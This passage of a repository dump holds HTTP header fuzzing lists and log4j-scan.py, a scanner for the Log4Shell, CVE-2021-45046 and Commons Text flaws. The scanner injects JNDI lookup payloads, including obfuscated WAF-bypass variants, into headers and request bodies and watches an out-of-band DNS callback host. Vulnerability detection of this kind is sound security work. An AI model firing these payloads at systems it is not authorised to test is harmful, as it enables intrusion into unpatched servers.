tp-Command\nX-Originally-Forwarded-For\nX-Originally-Forwarded-Proto\nX-Original-Remote-Addr\nX-Original-Url\nX-Original-User-Agent\nX-Originating-Ip\nX-Originating-IP\nX-Os-Prefs\nX-Overlay\nX-Pagelet-Fragment\nX-Password\nXpdb-Debugger\nX-Phabricator-Csrf\nX-Phpbb-Using-Plupload\nX-Pjax\nX-Pjax-Container\nX-Prototype-Version\nXproxy\nX-Proxy-Url\nX-ProxyUser-Ip\nX-Pswd\nX-Purpose\nX-Qafoo-Profiler\nX-Real-Ip\nX-Remote-Addr\nX-Remote-IP\nX-Remote-Protocol\nX-Render-Partial\nX-Request\nX-Requested-With\nX-Request-Id\nX-Request-ID\nX-Request-Signature\nX-Request-Start\nX-Request-Timestamp\nX-Response-Format\nX-Rest-Cors\nX-Rest-Password\nX-Rest-Username\nX-Rewrite-Url\nXroxy-Connection\nX-Sakura-Forwarded-For\nX-Scalr-Auth-Key\nX-Scalr-Auth-Token\nX-Scalr-Env-Id\nX-Scanner\nX-Scheme\nX-Screen-Height\nX-Screen-Width\nX-Sendfile-Type\nX-Serialize\nX-Serial-Number\nX-Server-Id\nX-Server-Name\nX-Server-Port\nX-Signature\nX-Sina-Proxyuser\nX-Skyfire-Phone\nX-Skyfire-Screen\nX-Ssl\nX-Subdomain\nX-Te\nX-Teamsite-Preremap\nX-Test-Session-Id\nX-Timer\nX-Tine20-Jsonkey\nX-Tine20-Request-Type\nX-Tomboy-Client\nX-Tor\nX-Twilio-Signature\nX-Ua-Device\nX-Ucbrowser-Device-Ua\nX-Uidh\nX-UIDH\nX-Unique-Id\nX-Uniquewcid\nX-Up-Calling-Line-Id\nX-Update\nX-Update-Range\nX-Up-Devcap-Iscolor\nX-Up-Devcap-Screendepth\nX-Up-Devcap-Screenpixels\nX-Upload-Maxresolution\nX-Upload-Name\nX-Upload-Size\nX-Upload-Type\nX-Up-Subno\nX-Url-Scheme\nX-User\nX-User-Agent\nX-Username\nX-Varnish\nX-Verify-Credentials-Authorization\nX-Vodafone-3gpdpcontext\nX-Wap-Clientid\nX-Wap-Client-Sdu-Size\nX-Wap-Gateway\nX-Wap-Network-Client-Ip\nX-Wap-Network-Client-Msisdn\nx-wap-profile\nX-Wap-Profile\nX-Wap-Proxy-Cookie\nX-Wap-Session-Id\nX-Wap-Tod\nX-Wap-Tod-Coded\nX-Whatever\nX-Wikimedia-Debug\nX-Wp-Nonce\nX-Wp-Pjax-Prefetch\nX-Ws-Api-Key\nX-Xc-Schema-Version\nX-Xhprof-Debug\nX-Xhr-Referer\nX-Xmlhttprequest\nX-Xpid\nX-XSRF-TOKEN\nX-XSS-Protection\nXxx-Real-Ip\nXxxxxxxxxxxxxxx\nX-Zikula-Ajax-Token\nX-Zotero-Version\nX-Ztgo-Bearerinfo\nY\nZotero-Api-Version\nZotero-Write-Token"
        },
        {
          "name": "headers-minimal.txt",
          "type": "blob",
          "size": 0.73828125,
          "content": "# Security appliances may reset requests when headers are larger then the typical.\nAccept-Charset\nAccept-Datetime\nAccept-Encoding\nAccept-Language\nCache-Control\nCookie\nDNT\nForwarded\nForwarded-For\nForwarded-For-Ip\nForwarded-Proto\nFrom\nMax-Forwards\nOrigin\nPragma\nReferer\nTrue-Client-IP\nUpgrade\nUser-Agent\nVia\nWarning\nX-Api-Version\nX-Att-DeviceId\nX-Correlation-ID\nX-Csrf-Token\nX-Do-Not-Track\nX-Forwarded\nX-Forwarded-By\nX-Forwarded-For\nX-Forwarded-Host\nX-Forwarded-Port\nX-Forwarded-Proto\nX-Forwarded-Scheme\nX-Forwarded-Server\nX-Forwarded-Ssl\nX-Forward-For\nX-From\nX-Geoip-Country\nX-Http-Destinationurl\nX-Http-Host-Override\nX-Http-Method\nX-Http-Method-Override\nX-Hub-Signature\nX-If-Unmodified-Since\nX-ProxyUser-Ip\nX-Requested-With\nX-Request-ID\nX-UIDH\nX-XSRF-TOKEN"
        },
        {
          "name": "headers.txt",
          "type": "blob",
          "size": 0.9140625,
          "content": "Accept-Charset\nAccept-Datetime\nAccept-Encoding\nAccept-Language\nCache-Control\nCookie\nDNT\nForwarded\nForwarded-For\nForwarded-For-Ip\nForwarded-Proto\nFrom\nMax-Forwards\nOrigin\nPragma\nReferer\nTE\nTrue-Client-IP\nUpgrade\nUser-Agent\nVia\nWarning\nX-Api-Version\nX-Att-Deviceid\nX-ATT-DeviceId\nX-Correlation-ID\nX-Csrf-Token\nX-CSRFToken\nX-Do-Not-Track\nX-Foo\nX-Foo-Bar\nX-Forwarded\nX-Forwarded-By\nX-Forwarded-For\nX-Forwarded-For-Original\nX-Forwarded-Host\nX-Forwarded-Port\nX-Forwarded-Proto\nX-Forwarded-Protocol\nX-Forwarded-Scheme\nX-Forwarded-Server\nX-Forwarded-Ssl\nX-Forwarder-For\nX-Forward-For\nX-Forward-Proto\nX-Frame-Options\nX-From\nX-Geoip-Country\nX-Http-Destinationurl\nX-Http-Host-Override\nX-Http-Method\nX-Http-Method-Override\nX-HTTP-Method-Override\nX-Http-Path-Override\nX-Https\nX-Htx-Agent\nX-Hub-Signature\nX-If-Unmodified-Since\nX-Imbo-Test-Config\nX-Insight\nX-Ip\nX-Ip-Trail\nX-ProxyUser-Ip\nX-Requested-With\nX-Request-ID\nX-UIDH\nX-Wap-Profile\nX-XSRF-TOKEN"
        },
        {
          "name": "log4j-scan.py",
          "type": "blob",
          "size": 18.0078125,
          "content": "#!/usr/bin/env python3\n# coding=utf-8\n# ******************************************************************\n# log4j-scan: A generic scanner for Apache log4j RCE CVE-2021-44228\n# Author:\n# Mazin Ahmed <Mazin at FullHunt.io>\n# Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.\n# Secure your Attack Surface with FullHunt.io.\n# ******************************************************************\n\nimport argparse\nimport random\nimport requests\nimport time\nimport sys\nfrom urllib import parse as urlparse\nimport base64\nimport json\nfrom uuid import uuid4\nfrom base64 import b64encode\nfrom Crypto.Cipher import AES, PKCS1_OAEP\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Hash import SHA256\nfrom termcolor import cprint\n\n\n# Disable SSL warnings\ntry:\n    import requests.packages.urllib3\n    requests.packages.urllib3.disable_warnings()\nexcept Exception:\n    pass\n\n\ncprint('[â€¢] CVE-2021-44228 - Apache Log4j RCE Scanner', \"green\")\ncprint('[â€¢] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.', \"yellow\")\ncprint('[â€¢] Secure your External Attack Surface with FullHunt.io.', \"yellow\")\n\nif len(sys.argv) <= 1:\n    print('\\n%s -h for help.' % (sys.argv[0]))\n    exit(0)\n\n\ndefault_headers = {\n    'User-Agent': 'log4j-scan (https://github.com/mazen160/log4j-scan)',\n    # 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',\n    'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers\n}\n\npost_data_parameters = [\"username\", \"user\", \"uname\", \"name\", \"email\", \"email_address\", \"password\"]\ntimeout = 4\n\nwaf_bypass_payloads = [\"${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}\",\n                       \"${${::-j}ndi:rmi://{{callback_host}}/{{random}}}\",\n                       \"${jndi:rmi://{{callback_host}}/{{random}}}\",\n                       \"${jndi:rmi://{{callback_host}}}/\",\n                       \"${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}\",\n                       \"${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}\",\n                       \"${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}\",\n                       \"${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}\",\n                       \"${jndi:dns://{{callback_host}}/{{random}}}\",\n                       \"${jnd${123%25ff:-${123%25ff:-i:}}ldap://{{callback_host}}/{{random}}}\",\n                       \"${jndi:dns://{{callback_host}}}\",\n                       \"${j${k8s:k5:-ND}i:ldap://{{callback_host}}/{{random}}}\",\n                       \"${j${k8s:k5:-ND}i:ldap${sd:k5:-:}//{{callback_host}}/{{random}}}\",\n                       \"${j${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{random}}}\",\n                       \"${j${k8s:k5:-ND}i${sd:k5:-:}ldap${sd:k5:-:}//{{callback_host}}/{{random}}}\",\n                       \"${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{random}}}\",\n                       \"${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap{sd:k5:-:}//{{callback_host}}/{{random}}}\",\n                       \"${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}ap${sd:k5:-:}//{{callback_host}}/{{random}}}\",\n                       \"${j${k8s:k5:-ND}i${sd:k5:-:}${lower:L}dap${sd:k5:-:}//{{callback_host}}/{{random}}\",\n                       \"${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//{{callback_host}}/{{random}}}\",\n                       \"${jndi:${lower:l}${lower:d}a${lower:p}://{{callback_host}}}\",\n                       \"${jnd${upper:i}:ldap://{{callback_host}}/{{random}}}\",\n                       \"${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{callback_host}}/{{random}}}\"\n                       ]\n\ncve_2021_45046 = [\n                  \"${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}\",  # Source: https://twitter.com/marcioalm/status/1471740771581652995,\n                  \"${jndi:ldap://127.0.0.1#{{callback_host}}/{{random}}}\",\n                  \"${jndi:ldap://127.1.1.1#{{callback_host}}/{{random}}}\"\n                 ]\n\ncve_2022_42889 =  [\n                  \"${url:UTF-8::https://{{callback_host}}/}\",\n                  \"${url:UTF-8::https://{{callback_host}}/{{random}}}\",\n                  \"${url:UTF-8::http://{{callback_host}}/}\",\n                  \"${url:UTF-8::http://{{callback_host}}/{{random}}}\",\n                  \"${dns:address|{{callback_host}}}\"\n                 ]\n\nparser = argparse.ArgumentParser()\nparser.add_argument(\"-u\", \"--url\",\n                    dest=\"url\",\n                    help=\"Check a single URL.\",\n                    action='store')\nparser.add_argument(\"-p\", \"--proxy\",\n                    dest=\"proxy\",\n                    help=\"send requests through proxy\",\n                    action='store')\nparser.add_argument(\"-l\", \"--list\",\n                    dest=\"usedlist\",\n                    help=\"Check a list of URLs.\",\n                    action='store')\nparser.add_argument(\"--request-type\",\n                    dest=\"request_type\",\n                    help=\"Request Type: (get, post) - [Default: get].\",\n                    default=\"get\",\n                    action='store')\nparser.add_argument(\"--headers-file\",\n                    dest=\"headers_file\",\n                    help=\"Headers fuzzing list - [default: headers.txt].\",\n                    default=\"headers.txt\",\n                    action='store')\nparser.add_argument(\"--run-all-tests\",\n                    dest=\"run_all_tests\",\n                    help=\"Run all available tests on each URL.\",\n                    action='store_true')\nparser.add_argument(\"--exclude-user-agent-fuzzing\",\n                    dest=\"exclude_user_agent_fuzzing\",\n                    help=\"Exclude User-Agent header from fuzzing - useful to bypass weak checks on User-Agents.\",\n                    action='store_true')\nparser.add_argument(\"--wait-time\",\n                    dest=\"wait_time\",\n                    help=\"Wait time after all URLs are processed (in seconds) - [Default: 5].\",\n                    default=5,\n                    type=int,\n                    action='store')\nparser.add_argument(\"--waf-bypass\",\n                    dest=\"waf_bypass_payloads\",\n                    help=\"Extend scans with WAF bypass payloads.\",\n                    action='store_true')\nparser.add_argument(\"--custom-waf-bypass-payload\",\n                    dest=\"custom_waf_bypass_payload\",\n                    help=\"Test with custom WAF bypass payload.\")\nparser.add_argument(\"--test-CVE-2021-45046\",\n                    dest=\"cve_2021_45046\",\n                    help=\"Test using payloads for CVE-2021-45046 (detection payloads).\",\n                    action='store_true')\nparser.add_argument(\"--test-CVE-2022-42889\",\n                    dest=\"cve_2022_42889\",\n                    help=\"Test using payloads for Apache Commons Text RCE (CVE-2022-42889).\",\n                    action='store_true')\nparser.add_argument(\"--dns-callback-provider\",\n                    dest=\"dns_callback_provider\",\n                    help=\"DNS Callback provider (Options: dnslog.cn, interact.sh) - [Default: interact.sh].\",\n                    default=\"interact.sh\",\n                    action='store')\nparser.add_argument(\"--custom-dns-callback-host\",\n                    dest=\"custom_dns_callback_host\",\n                    help=\"Custom DNS Callback Host.\",\n                    action='store')\nparser.add_argument(\"--disable-http-redirects\",\n                    dest=\"disable_redirects\",\n                    help=\"Disable HTTP redirects. Note: HTTP redirects are useful as it allows the payloads to have a higher chance of reaching vulnerable systems.\",\n                    action='store_true')\n\nargs = parser.parse_args()\n\n\nproxies = {}\nif args.proxy:\n    proxies = {\"http\": args.proxy, \"https\": args.proxy}\n\n\nif args.custom_waf_bypass_payload:\n    waf_bypass_payloads.append(args.custom_waf_bypass_payload)\n\n\ndef get_fuzzing_headers(payload):\n    fuzzing_headers = {}\n    fuzzing_headers.update(default_headers)\n    with open(args.headers_file, \"r\") as f:\n        for i in f.readlines():\n            i = i.strip()\n            if i == \"\" or i.startswith(\"#\"):\n                continue\n            fuzzing_headers.update({i: payload})\n    if args.exclude_user_agent_fuzzing:\n        fuzzing_headers[\"User-Agent\"] = default_headers[\"User-Agent\"]\n\n    if \"Referer\" in fuzzing_headers:\n        fuzzing_headers[\"Referer\"] = f'https://{fuzzing_headers[\"Referer\"]}'\n    return fuzzing_headers\n\n\ndef get_fuzzing_post_data(payload):\n    fuzzing_post_data = {}\n    for i in post_data_parameters:\n        fuzzing_post_data.update({i: payload})\n    return fuzzing_post_data\n\n\ndef generate_waf_bypass_payloads(callback_host, random_string):\n    payloads = []\n    for i in waf_bypass_payloads:\n        new_payload = i.replace(\"{{callback_host}}\", callback_host)\n        new_payload = new_payload.replace(\"{{random}}\", random_string)\n        payloads.append(new_payload)\n    return payloads\n\n\ndef get_cve_2021_45046_payloads(callback_host, random_string):\n    payloads = []\n    for i in cve_2021_45046:\n        new_payload = i.replace(\"{{callback_host}}\", callback_host)\n        new_payload = new_payload.replace(\"{{random}}\", random_string)\n        payloads.append(new_payload)\n    return payloads\n\n\ndef get_cve_2022_42889_payloads(callback_host, random_string):\n    payloads = []\n    for i in cve_2022_42889:\n        new_payload = i.replace(\"{{callback_host}}\", callback_host)\n        new_payload = new_payload.replace(\"{{random}}\", random_string)\n        payloads.append(new_payload)\n    return payloads\n\n\nclass Dnslog(object):\n    def __init__(self):\n        self.s = requests.session()\n        req = self.s.get(\"http://www.dnslog.cn/getdomain.php\",\n                         proxies=proxies,\n                         timeout=30)\n        self.domain = req.text\n\n    def pull_logs(self):\n        req = self.s.get(\"http://www.dnslog.cn/getrecords.php\",\n                         proxies=proxies,\n                         timeout=30)\n        return req.json()\n\n\nclass Interactsh:\n    # Source: https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/modules/interactsh/__init__.py\n    def __init__(self, token=\"\", server=\"\"):\n        rsa = RSA.generate(2048)\n        self.public_key = rsa.publickey().exportKey()\n        self.private_key = rsa.exportKey()\n        self.token = token\n        self.server = server.lstrip('.') or 'interact.sh'\n        self.headers = {\n            \"Content-Type\": \"application/json\",\n        }\n        if self.token:\n            self.headers['Authorization'] = self.token\n        self.secret = str(uuid4())\n        self.encoded = b64encode(self.public_key).decode(\"utf8\")\n        guid = uuid4().hex.ljust(33, 'a')\n        guid = ''.join(i if i.isdigit() else chr(ord(i) + random.randint(0, 20)) for i in guid)\n        self.domain = f'{guid}.{self.server}'\n        self.correlation_id = self.domain[:20]\n\n        self.session = requests.session()\n        self.session.headers = self.headers\n        self.session.verify = False\n        self.session.proxies = proxies\n        self.register()\n\n    def register(self):\n        data = {\n            \"public-key\": self.encoded,\n            \"secret-key\": self.secret,\n            \"correlation-id\": self.correlation_id\n        }\n        res = self.session.post(\n            f\"https://{self.server}/register\", headers=self.headers, json=data, timeout=30)\n        if 'success' not in res.text:\n            raise Exception(\"Can not initiate interact.sh DNS callback client\")\n\n    def pull_logs(self):\n        result = []\n        url = f\"https://{self.server}/poll?id={self.correlation_id}&secret={self.secret}\"\n        res = self.session.get(url, headers=self.headers, timeout=30).json()\n        aes_key, data_list = res['aes_key'], res['data']\n        for i in data_list:\n            decrypt_data = self.__decrypt_data(aes_key, i)\n            result.append(self.__parse_log(decrypt_data))\n        return result\n\n    def __decrypt_data(self, aes_key, data):\n        private_key = RSA.importKey(self.private_key)\n        cipher = PKCS1_OAEP.new(private_key, hashAlgo=SHA256)\n        aes_plain_key = cipher.decrypt(base64.b64decode(aes_key))\n        decode = base64.b64decode(data)\n        bs = AES.block_size\n        iv = decode[:bs]\n        cryptor = AES.new(key=aes_plain_key, mode=AES.MODE_CFB, IV=iv, segment_size=128)\n        plain_text = cryptor.decrypt(decode)\n        return json.loads(plain_text[16:])\n\n    def __parse_log(self, log_entry):\n        new_log_entry = {\"timestamp\": log_entry[\"timestamp\"],\n                         \"host\": f'{log_entry[\"full-id\"]}.{self.domain}',\n                         \"remote_address\": log_entry[\"remote-address\"]\n                         }\n        return new_log_entry\n\n\ndef parse_url(url):\n    \"\"\"\n    Parses the URL.\n    \"\"\"\n\n    # Url: https://example.com/login.jsp\n    url = url.replace('#', '%23')\n    url = url.replace(' ', '%20')\n\n    if ('://' not in url):\n        url = str(\"http://\") + str(url)\n    scheme = urlparse.urlparse(url).scheme\n\n    # FilePath: /login.jsp\n    file_path = urlparse.urlparse(url).path\n    if (file_path == ''):\n        file_path = '/'\n\n    return({\"scheme\": scheme,\n            \"site\": f\"{scheme}://{urlparse.urlparse(url).netloc}\",\n            \"host\":  urlparse.urlparse(url).netloc.split(\":\")[0],\n            \"file_path\": file_path})\n\n\ndef scan_url(url, callback_host):\n    parsed_url = parse_url(url)\n    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))\n    payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url[\"host\"], callback_host, random_string)\n    payloads = [payload]\n    if args.waf_bypass_payloads:\n        payloads.extend(generate_waf_bypass_payloads(f'{parsed_url[\"host\"]}.{callback_host}', random_string))\n\n    if args.cve_2021_45046:\n        cprint(f\"[â€¢] Scanning for CVE-2021-45046 (Log4j v2.15.0 Patch Bypass - RCE)\", \"yellow\")\n        payloads.extend(get_cve_2021_45046_payloads(f'{parsed_url[\"host\"]}.{callback_host}', random_string))\n\n    if args.cve_2022_42889:\n        cprint(f\"[â€¢] Scanning for CVE-2022-42889 (Apache Commons Text RCE)\", \"yellow\")\n        payloads.extend(get_cve_2022_42889_payloads(f'{parsed_url[\"host\"]}.{callback_host}', random_string))\n\n    for payload in payloads:\n        cprint(f\"[â€¢] URL: {url} | PAYLOAD: {payload}\", \"cyan\")\n\n        if args.request_type.upper() == \"GET\" or args.run_all_tests:\n            try:\n                requests.request(url=url,\n                                 method=\"GET\",\n                                 params={\"v\": payload},\n                                 headers=get_fuzzing_headers(payload),\n                                 verify=False,\n                                 timeout=timeout,\n                                 allow_redirects=(not args.disable_redirects),\n                                 proxies=proxies)\n            except Exception as e:\n                cprint(f\"EXCEPTION: {e}\")\n\n        if args.request_type.upper() == \"POST\" or args.run_all_tests:\n            try:\n                # Post body\n                requests.request(url=url,\n                                 method=\"POST\",\n                                 params={\"v\": payload},\n                                 headers=get_fuzzing_headers(payload),\n                                 data=get_fuzzing_post_data(payload),\n                                 verify=False,\n                                 timeout=timeout,\n                                 allow_redirects=(not args.disable_redirects),\n                                 proxies=proxies)\n            except Exception as e:\n                cprint(f\"EXCEPTION: {e}\")\n\n            try:\n                # JSON body\n                requests.request(url=url,\n                                 method=\"POST\",\n                                 params={\"v\": payload},\n                                 headers=get_fuzzing_headers(payload),\n                                 json=get_fuzzing_post_data(payload),\n                                 verify=False,\n                                 timeout=timeout,\n                                 allow_redirects=(not args.disable_redirects),\n                                 proxies=proxies)\n            except Exception as e:\n                cprint(f\"EXCEPTION: {e}\")\n\n\ndef main():\n    urls = []\n    if args.url:\n        urls.append(args.url)\n    if args.usedlist:\n        with open(args.usedlist, \"r\") as f:\n            for i in f.readlines():\n                i = i.strip()\n                if i == \"\" or i.startswith(\"#\"):\n                    continue\n                urls.append(i)\n\n    dns_callback_host = \"\"\n    if args.custom_dns_callback_host:\n        cprint(f\"[â€¢] Using custom DNS Callback host [{args.custom_dns_callback_host}]. No verification will be done after sending fuzz requests.\")\n        dns_callback_host = args.custom_dns_callback_host\n    else:\n        cprint(f\"[â€¢] Initiating DNS callback server ({args.dns_callback_provider}).\")\n        if args.dns_callback_provider == \"interact.sh\":\n            dns_callback = Interactsh()\n        elif args.dns_callback_provider == \"dnslog.cn\":\n            dns_callback = Dnslog()\n        else:\n            raise ValueError(\"Invalid DNS Callback provider\")\n        dns_callback_host = dns_callback.domain\n\n    cprint(\"[%] Checking for Log4j RCE CVE-2021-44228.\", \"magenta\")\n    for url in urls:\n        cprint(f\"[â€¢] URL: {url}\", \"magenta\")\n        scan_url(url, dns_callback_host)\n\n    if args.custom_dns_callback_host:\n        cprint(\"[â€¢] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.\", \"cyan\")\n        return\n\n    cprint(\"[â€¢] Payloads sent to all URLs. Waiting for DNS OOB callbacks.\", \"cyan\")\n    cprint(\"[â€¢] Waiting...\", \"cyan\")\n    time.sleep(int(args.wait_time))\n    records = dns_callback.pull_logs()\n    if len(records) == 0:\n        cprint(\"[â€¢] Targets do not seem to be vulnerable.\", \"green\")\n    else:\n        cprint(\"[!!!] Targets Affected\", \"yellow\")\n        for i in records:\n            cprint(json.dumps(i), \"yellow\")\n\n\nif __name__ == \"__main__\":\n    try:\n        main()\n    except KeyboardInterrupt:\n        print(\"\\nKeyboardInterrupt Detected.\")\n        print(\"Exiting...\")\n        exit(0)\n"
        },
        {
          "name": "requirements.txt",
          "type": "blob",
          "size": 0.0302734375,
          "content": "requests\ntermcolor\nPyCryptodome"
        }
      ]
    }
  ]
}